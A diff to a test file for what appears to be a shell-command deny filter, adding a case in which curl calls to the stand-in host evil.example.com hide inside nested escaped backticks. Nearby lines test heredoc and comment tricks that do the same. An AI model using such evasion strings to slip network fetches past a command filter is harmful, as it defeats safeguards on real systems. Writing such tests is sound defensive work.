@@ -625,6 +625,12 @@ describe('a URL variable used inside a $(...) or backtick substitution', () => {
     for (const cmd of ['(true)#; curl https://evil.example.com/p', '((1))#; curl https://evil.example.com/p'])
       expect(classify(cmd).deny, cmd).toBe(false)
   })
+  it('a nested (escaped) backtick inside a backtick is a command too (card f7d4ead8, oracle matrix; main allowed it)', () => {
+    expect(deny('echo `true \\`curl https://evil.example.com/p\\``')).toBe(true)
+    expect(deny('x=`echo \\`curl https://evil.example.com/p\\``')).toBe(true)
+    // an escaped $ in a backtick body is a plain $ when the body runs: still no command of its own
+    expect(deny('echo `echo \\$HOME`')).toBe(false)
+  })
   it('lexer mutants j01 and j07 flip a verdict (Viktor 42794 (3))', () => {
     // j01 striptabs-off: the tab-stripped delimiter closes the body, the curl after it runs
     expect(deny('cat <<-E\n\tbody\n\tE\ncurl https://evil.example.com/p')).toBe(true)
